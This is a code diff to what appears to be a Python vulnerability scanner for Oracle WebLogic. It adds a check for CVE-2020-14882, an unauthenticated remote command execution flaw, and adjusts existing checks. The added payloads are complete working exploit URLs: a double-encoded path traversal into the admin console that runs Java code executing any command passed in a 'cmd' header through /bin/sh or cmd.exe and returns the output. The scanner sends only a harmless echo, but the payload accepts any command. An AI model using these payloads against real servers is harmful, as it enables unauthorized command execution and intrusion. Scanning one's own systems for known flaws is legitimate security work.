@@ -3,6 +3,8 @@
 
 '''
     Weblogic扫描类: 
+        Weblogic 管理控制台未授权远程命令执行
+            CVE-2020-14882
         Weblogic 权限验证绕过漏洞
             CVE-2020-14750
         Weblogic wls9_async_response 反序列化漏洞
@@ -28,6 +30,17 @@ class Weblogic():
         self.app_name = 'Weblogic'
         self.md = md5(self.app_name)
         self.cmd = 'echo ' + self.md
+
+        self.cve_2020_14882_payloads = [
+            {
+                'path': 'console/images/%252E./consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')',
+                'data': ''
+            },
+            {
+                'path': 'console/images/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')',
+                'data': ''
+            },
+        ]
 
         self.cve_2020_14750_payloads = [
             {
@@ -92,6 +105,64 @@ class Weblogic():
             }
         ]
 
+    def cve_2020_14882_scan(self, url):
+        ''' Weblogic 管理控制台未授权远程命令执行
+                配合CVE-2020-14750未授权进入后台, 调用相关接口实现命令执行
+        '''
+        vul_info = {}
+        vul_info['app_name'] = self.app_name
+        vul_info['vul_type'] = 'RCE'
+        vul_info['vul_id'] = 'CVE-2020-14882'
+        vul_info['vul_method'] = 'GET'
+        vul_info['headers'] = {
+            'cmd': self.cmd
+        }
+
+        headers = self.headers
+        headers.update(vul_info['headers'])
+
+        for payload in self.cve_2020_14882_payloads:    # * Payload
+            path = payload['path']                      # * Path
+            data = payload['data']                      # * Data
+            target = url + path                         # * Target
+
+            vul_info['path'] = path
+            vul_info['data'] = data
+            vul_info['target'] = target
+
+            try:
+                res = requests.get(
+                    target, 
+                    timeout=self.timeout, 
+                    headers=headers, 
+                    data=data, 
+                    proxies=self.proxies, 
+                    verify=False
+                )
+                vul_info['status_code'] = str(res.status_code)
+                logger.logging(vul_info)                        # * LOG
+            except requests.ConnectTimeout:
+                vul_info['status_code'] = 'Timeout'
+                logger.logging(vul_info)
+                return None
+            except requests.ConnectionError:
+                vul_info['status_code'] = 'Faild'
+                logger.logging(vul_info)
+                return None
+
+            if (self.md in check.check_res(res.text, self.md)):
+                results = {
+                    'Target': url + 'console/images/%252E./consolejndi.portal',
+                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                    'Method': vul_info['vul_method'],
+                    'Payload': {
+                        'Url': url,
+                        'Path': path,
+                        'Headers': str(vul_info['headers'])
+                    }
+                }
+                return results
+
     def cve_2020_14750_scan(self, url):
         ''' Weblogic 权限验证绕过漏洞
                 可通过目录跳转符../回到上一级目录, 然后在../后面拼接console后台目录, 即可绕过后台登录, 直接进入后台
@@ -128,11 +199,14 @@ class Weblogic():
                 vul_info['status_code'] = str(res.status_code)
                 logger.logging(vul_info)                        # * LOG
 
-                if (res.status_code == 302):
-                    cookie = {
-                        'Cookie': res.headers['Set-Cookie']
-                    }
-                    headers.update(cookie)
+                if ((res.status_code == 302) and ('Set-Cookie' in res.headers)):
+                    try:
+                        cookie = {
+                            'Cookie': res.headers['Set-Cookie']
+                        }
+                        headers.update(cookie)
+                    except KeyError:
+                        continue
 
                     res = requests.get(
                     target, 
@@ -311,9 +385,10 @@ class Weblogic():
 
     def addscan(self, url):
         return [
-            thread(target=self.cve_2017_10271_scan, url=url),
+            thread(target=self.cve_2020_14750_scan, url=url),
             thread(target=self.cve_2019_2725_scan, url=url),
-            thread(target=self.cve_2020_14750_scan, url=url)
+            thread(target=self.cve_2017_10271_scan, url=url),
+            thread(target=self.cve_2020_14882_scan, url=url)
         ]
 
 weblogic = Weblogic()
